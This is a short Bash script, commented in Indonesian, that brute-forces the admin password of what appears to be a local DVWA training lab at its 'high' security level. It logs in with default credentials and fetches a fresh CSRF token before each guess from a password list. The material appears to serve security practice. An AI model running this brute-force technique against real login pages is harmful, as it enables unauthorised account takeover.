#!/bin/bash
TARGET="http://127.0.0.1:8000"
COOKIE_JAR=$(mktemp)
SECURITY_LEVEL="high"

echo "[*] Mengambil token CSRF awal..."
INIT_RESP=$(curl -s -c "$COOKIE_JAR" "$TARGET/login.php")
USER_TOKEN=$(echo "$INIT_RESP" | grep -oE "name='user_token' value='[^']+'" | cut -d"'" -f4)

echo "[*] Login..."
curl -s -L -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
  --data "username=admin&password=password&Login=Login&user_token=$USER_TOKEN" \
  "$TARGET/login.php" > /dev/null

echo "[*] Set security ke HIGH"
curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
  --data "security=$SECURITY_LEVEL&seclev_submit=Submit" \
  "$TARGET/security.php" > /dev/null

echo "[+] Target: $TARGET/vulnerabilities/brute/ [HIGH]"
echo "-----------------------------------------------"

while read -r PASS; do
  # DI HIGH WAJIB AMBIL TOKEN BARU TIAP REQUEST
  BRUTE_PAGE=$(curl -s -b "$COOKIE_JAR" "$TARGET/vulnerabilities/brute/")
  TOKEN_BRUTE=$(echo "$BRUTE_PAGE" | grep -oE "name='user_token' value='[^']+'" | cut -d"'" -f4)

  if [ -z "$TOKEN_BRUTE" ]; then
    echo "[-] Token high gak ketemu, retry..."
    sleep 1
    continue
  fi

  RESP=$(curl -s -G \
    --data-urlencode "username=admin" \
    --data-urlencode "password=$PASS" \
    --data-urlencode "user_token=$TOKEN_BRUTE" \
    --data-urlencode "Login=Login" \
    -b "$COOKIE_JAR" \
    "$TARGET/vulnerabilities/brute/")

  echo "[*] Trying: $PASS -> token ${TOKEN_BRUTE:0:8}..."

  if echo "$RESP" | grep -q "Welcome to the password protected area admin"; then
    echo ""
    echo "[+] KETEMU! Password admin: $PASS"
    break
  fi
done < passlist.txt

rm -f "$COOKIE_JAR"
